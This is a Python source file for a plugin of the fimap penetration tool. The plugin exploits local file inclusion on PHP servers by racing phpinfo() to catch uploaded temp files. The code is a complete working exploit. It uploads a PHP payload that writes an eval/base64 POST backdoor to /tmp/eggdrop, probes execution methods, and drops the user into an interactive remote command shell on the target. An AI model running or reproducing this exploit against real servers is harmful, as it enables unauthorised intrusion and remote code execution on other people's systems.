from plugininterface import basePlugin

# This plugin is based on Insomnia Security's Whitepaper:
# http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf
#
# Plugin by Iman Karim <fimap.dev@gmail.com>
# License: GPLv2

import urlparse, re, socket, threading, base64, urllib, string, random



class TempFileAbuse(basePlugin):
    egg = "/tmp/eggdrop"
    phpinfourl = ""
    
    maxAttempts = 5000
    maxThreads = 10
    trashFactor = 3000
    
    def plugin_init(self):
        self.display = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(32))
        self.evalshell = "<?php $var=\"data\"; if (isset($var)){eval(base64_decode($_POST[$var]));} ?>"
        self.payload = "<?php $c=fopen('%s', 'w'); fwrite($c, '%s'); fclose($c); echo '%s' ?>" %(self.egg, self.evalshell, self.display)
        
        self.FILE_DATA = "-----------------------------58239048594367238956\r\n"
        self.FILE_DATA += "Content-Disposition: form-data; name=\"datafile\"; filename=\"trash.txt\"\r\n"
        self.FILE_DATA += "Content-Type: text/plain\r\n"
        self.FILE_DATA += "\r\n"
        self.FILE_DATA += "%s\n" %(self.payload)
        self.FILE_DATA += "\r\n-----------------------------58239048594367238956--\r\n"
        
        self.HTTP_DATA  = "POST __PATH__?a=__TRASH__ HTTP/1.1\r\n"
        self.HTTP_DATA += "Host: __HOST__\r\n"
        self.HTTP_DATA += "Cookie: SOMECOOKIE=__TRASH__; SOMECOOKIE2=__TRASH__\r\n" 
        self.HTTP_DATA += "HTTP_ACCEPT: __TRASH__\r\n"
        self.HTTP_DATA += "HTTP_USER_AGENT: __TRASH__\r\n"
        self.HTTP_DATA += "HTTP_ACCEPT_LANGUAGE: __TRASH__\r\n"
        self.HTTP_DATA += "HTTP_PRAGMA: __TRASH__\r\n"
        self.HTTP_DATA += "Content-Type: multipart/form-data; boundary=---------------------------58239048594367238956\r\n"
        self.HTTP_DATA += "Content-Length: %s\r\n" %str(len(self.FILE_DATA))
        self.HTTP_DATA += "\r\n"
        self.HTTP_DATA += self.FILE_DATA
        
        
        
        
        
    def plugin_loaded(self):
        # This function will be called if all plugins are loaded.
        pass
        
    def plugin_exploit_modes_requested(self, langClass, isSystem, isUnix):
        return([])
        
     
    def plugin_fallback_modes_requested(self, langClass):

        ret = []
        if (langClass.getName() == "PHP"):
            self.lang = langClass
            ret.append(("Launch Coldwind/Insomnia Glitch...", "TempFileAbuse.hax"))

        return(ret)
        
    def plugin_callback_handler(self, callbackstring, haxhelper):
        if (callbackstring == "TempFileAbuse.hax"):
            
            print "-----------------------------------------------------------------------------"
            print "This plugin wouldn't be possible without the hard research of"
            print "     Gynvael Coldwind (http://gynvael.coldwind.pl)"
            print "      and"
            print "     Insomnia Security (http://insomniasec.com)"
            print "since it's based on this paper:"
            print "http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf"
            print "-----------------------------------------------------------------------------"
            
            inp = -1
            
            while(inp != "q" and inp != "Q"):
                options = []
                
                urlDisplay = self.phpinfourl
                
                if (urlDisplay == ""):
                    urlDisplay = "<None - Define one!>"
                
                options.append("1. Enter URL of PHPInfo()")
                options.append("2. AutoProbe for PHPInfo()")
                options.append("   Current URL: %s" %(urlDisplay))
                options.append("3. Change number of attempts (Current: %d)" %(self.maxAttempts))
                options.append("4. Change number of threads (Current: %d)" %(self.maxThreads))
                options.append("5. Change eggdrop location (Current: %s)" %(self.egg))
                options.append("6. Change number of trash to append (Current: %s)" %(self.trashFactor))
                options.append("7. Launch attack")
                options.append("q. Back to fimap")
                
                haxhelper.drawBox("PHPInfo Coldwind/Insomnia Glitch", options)
                inp = raw_input("Choose action: ")
                
                try:
                    idx = int(inp)
                    
                    if (idx == 1):
                        self.phpinfourl = raw_input("Please type in the complete URL of the PHPInfo() file: ")
                        print "PHPInfo() URL changed to: %s" %(self.phpinfourl)
                    
                    elif (idx == 2):
                        print "AutoProbe not implemented right now :("
                        
                    elif (idx == 3):
                        tmp = raw_input("Please type in the number of attempts you wish: ")
                        try:
                            n = int(tmp)
                            if (n <= 0):
                                print "WTH. Zero or less attempts are not smart bro."
                            else:
                                self.maxAttempts = n
                                print "MaxAttempts changed to: %s" %(self.maxAttemps)
                        except:
                            print "Invalid number."
                        
                    elif (idx == 4):
                        tmp = raw_input("Please type in the number of threads you wish: ")
                        try:
                            n = int(tmp)
                            if (n <= 0):
                                print "WTH. Zero or less threads are not smart bro."
                            else:
                                self.maxThreads = n
                                print "MaxThreads changed to: %s" %(self.maxThreads)
                        except:
                            print "Invalid number."
                        
                    if (idx == 5):
                        self.egg = raw_input("Please type location where to try to drop the egg: ")
                        print "EggDrop location changed to: %s" %(self.egg)
                    
                    elif (idx == 6):
                        tmp = raw_input("Please type in the number of trash to append: ")
                        try:
                            n = int(tmp)
                            if (n < 0):
                                print "WTH. Less than zero trash is not possible. Trust me I tried it hard."
                            else:
                                self.trashFactor = n
                                print "TrashFactor changed to: %s" %(self.trashFactor)
                        except:
                            print "Invalid number."
                    
                    if (idx == 7):
                        if (self.phpinfourl != None and self.phpinfourl != ""):
                            print "Checking if the URL you provided is really a PHPInfo file..."
                            code = self.doGetRequest(self.phpinfourl)
                            if (code.find("alt=\"PHP Logo\"") == -1):
                                print "The URL '%s' is not a PHP info file! :(" %(self.phpinfourl)
                                return
                            print "Launching attack..."
                            if (self.createEgg(haxhelper)):
                                # SUCCESSFULLY CREATED EVAL SHELL AT self.egg
                            
                                shell_banner = "fimap_eggshell> "
                                
                                lang = haxhelper.langClass
                                
                                quiz, answer = lang.generateQuiz()
                                #Since it's eval'd we remove the stuff...
                                quiz = quiz.replace("<?php", "")
                                quiz = quiz.replace("?>", "")
                            
                                path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(self.egg)
                                
                                domain = urlparse.urlsplit(self.phpinfourl)[1]
                                url = urlparse.urljoin("http://" + domain, path)
                                
                                post = ""
                                
                                if (postdata != ""):
                                    post = postdata + "&"
                                
                                post += urllib.urlencode({"data": base64.b64encode(quiz)})
                                res = haxhelper.doRequest(url, post, header)
                                
                                if (res == answer):
                                    print "PHP Code Injection thru EggDrop works!"
                                    xmlconfig = haxhelper.parent_codeinjector.config["XML2CONFIG"]
                                    shellquiz, shellanswer = xmlconfig.generateShellQuiz(haxhelper.isUnix)
                                    shell_test_code = shellquiz
                                    shell_test_result = shellanswer 
                                    for item in self.lang.getExecMethods():
                                        name = item.getName()
                                        payload = None
                                        if (item.isUnix() and haxhelper.isUnix) or (item.isWindows() and not haxhelper.isUnix):
                                            self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
                                            code = item.generatePayload(shell_test_code)
                                            code = code.replace("<?php", "")
                                            code = code.replace("?>", "")
                                            testload = urllib.urlencode({"data": base64.b64encode(code)})
                                            
                                            if (postdata != ""):
                                                testload = "%s&%s" %(postdata, testload)
                                            code = self.doPostRequest(url, testload, header)
                                            
                                            if code != None and code.find(shell_test_result) != -1:
                                                working_shell = item
                                                self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
                                                
                                                print "--------------------------------------------------------------------"
                                                print "Welcome to the fimap_eggshell!"
                                                print "This is a lite version of the fimap shell."
                                                print "Consider this shell as a temporary shell you should get rid of asap."
                                                print "Upload your own shell to be on the safe side."
                                                print "--------------------------------------------------------------------"  
                                                
                                                payload = raw_input(shell_banner)
                                                
                                                while (payload != "q" and payload != "Q"):
                                                    payload = item.generatePayload(payload)
                                                    payload = payload.replace("<?php", "")
                                                    payload = payload.replace("?>", "")
                                                    payload = urllib.urlencode({"data": base64.b64encode(payload)})
                                                    if (postdata != ""):
                                                        payload = "%s&%s" %(postdata, payload)
                                                    code = self.doPostRequest(url, payload, header)
                                                    print code
                                                    payload = raw_input(shell_banner)
                                                
                                                return
                                        else:
                                            self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
                                else:
                                    print "PHP Code Injection thru EggDrop failed :("
                                    return
                            
                        else:
                            print "No PHPInfo() URL defined."
                            
                except (ValueError):
                    pass
            
    def createEgg(self, haxhelper):
        host = urlparse.urlsplit(self.phpinfourl)[1]
        path = urlparse.urlsplit(self.phpinfourl)[2]
        
        runningThreads = []
        
        attempt = 1
        success = False
        while (True):
            if(attempt > self.maxAttempts): break
            
            if (len(runningThreads) < self.maxThreads):
                content = self.HTTP_DATA
                
                trash = "A" * self.trashFactor
                
                content = content.replace("__TRASH__", trash)
                content = content.replace("__HOST__", host)
                content = content.replace("__PATH__", path)
                content = content.replace("__SIZE_OF_FILE__", str(len(self.payload)))
                content = content.replace("__FILE_CONTENT__", self.payload)
                
                newThread = ProbeThread(host, 80, content, haxhelper, self.display)
                runningThreads.append(newThread)
                newThread.start()
                #print "Thread Attempt %d started..." %(attempt)
                attempt+=1
            else:
                for probe in runningThreads:
                    if (probe.finished):
                        runningThreads.remove(probe)
                        if probe.foundShell:
                            success = True
                            break;
            
        if (success):
            print "Egg dropped successfully!"
        
        print "Waiting for remaining threads to finish..."
        while(len(runningThreads) > 0):
                for t in runningThreads:
                    if t.finished:
                        runningThreads.remove(t)
        
        print "Finished."
        
        return(success)
                    
class ProbeThread(threading.Thread):
    parseFileRegex="\\[tmp_name\\] =&gt; (/.*)"
    RE_SUCCESS_MSG = re.compile(parseFileRegex)
    
    def __init__(self, host, port, http_content, haxhelper, display):
        threading.Thread.__init__(self)
        self.finished = False
        self.foundShell = False
        self.host = host
        self.port = port
        self.content = http_content
        self.hax = haxhelper
        self.display = display
        
     
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #print "Connecting to %s:%s" %(self.host, self.port)
        sock.connect((self.host, self.port))
        sock2.connect((self.host, self.port))
        
        sock.send(self.content)
        
        receivedData = ""
        while(True):
            tmpData = sock.recv(4096)
            receivedData += tmpData
            
            if (receivedData.find("[tmp_name] =&gt") != -1):
                break
            
            if (tmpData == "") or tmpData.endswith("0\r\n\r\n"):
                break
            
                            
        if (receivedData.find("[tmp_name] =&gt") == -1):
            print "File apperently not send?!?!"
        else:
            m = self.RE_SUCCESS_MSG.search(receivedData)
            if (m != None):
                tmpFile = m.group(1)
                
                egghunt = self.hax.getRawHTTPRequest(tmpFile)
                sock2.send(egghunt)
                
                receivedData = sock2.recv(2024)
                sock.close()
                sock2.close()
                
                if (receivedData.find(self.display) != -1):
                    self.foundShell = True

        self.finished = True
